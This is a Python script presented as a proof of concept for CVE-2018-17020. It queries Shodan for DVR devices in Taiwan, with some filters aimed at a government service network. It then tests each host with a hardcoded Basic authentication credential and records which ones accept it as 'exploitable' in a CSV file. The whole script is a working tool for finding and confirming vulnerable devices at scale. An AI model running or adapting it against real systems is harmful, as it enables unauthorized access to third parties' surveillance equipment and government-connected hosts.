"""Module Proof of Concept for CVE-2018-17020."""
import os
import sys
import socket

import pandas as pd
import requests

import helper.function as func
import helper.http_validator as http
from package.ip2gov_adapter import Ip2govAdapter
from package.shodan_adapter import ShodanAdapter

ACCESSIBLE_CODES = [200]


def get_response_code(url):
    try:
        headers = {
            'User-Agent':
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
            'Authorization': 'Basic cmVwb3J0OjhKZzBTUjhLNTA='
        }
        # ignore verifying the SSL certificate
        response = requests.get(url,
                                headers=headers,
                                allow_redirects=True,
                                verify=False,
                                timeout=5)
        return response.status_code
    except Exception as e:
        print(e)
        return False


def is_accessible(request_url):
    """Function confirm that web field is accessible."""
    code = get_response_code(request_url)
    print(code)
    if code not in ACCESSIBLE_CODES:
        return False

    return True


if __name__ == '__main__':

    ip2gov = Ip2govAdapter()
    sa = ShodanAdapter()

    filter_string = '19dec2003 DVR country:"tw" org:"Government Service Network (GSN)"'
    filter_string = 'http.html:"19dec2003" org:"Government Service Network (GSN)"'
    filter_string = 'http.html:"19dec2003" country:"tw"'
    filter_string = '19dec2003 DVR country:"tw"'

    match_fields = [
        {
            'label': 'ip',
            'field': 'ip_str'
        },
        {
            'label': 'port',
            'field': 'port'
        },
        {
            'label': 'product',
            'field': 'product'
        },
        {
            'label': 'ssl',
            'field': 'ssl'
        },
    ]


    fields = sa.basic_query_by_string(filter_string , match_fields)
    print(fields)


    output = []
    for field in fields:

        EXPLOITABLE = False
        host = field['ip']
        port = field['port']

        if field['ssl'] is None:
            field['ssl'] = False
            url = f"http://{host}:{port}"
        else:
            field['ssl'] = True
            url = f"https://{host}:{port}"

        print(host, port, url)
        if is_accessible(url):
            print("exploitable: True")
            EXPLOITABLE = True
        else:
            print("exploitable: False")


        output.append(
                field | \
                {'EXPLOITABLE': EXPLOITABLE}
        )

df = pd.DataFrame(output)
path_to_csv = os.path.join(os.path.dirname(__file__), "data",
                           "use_iwatch.csv")
df.to_csv(path_to_csv, index=False, encoding='utf-8-sig')
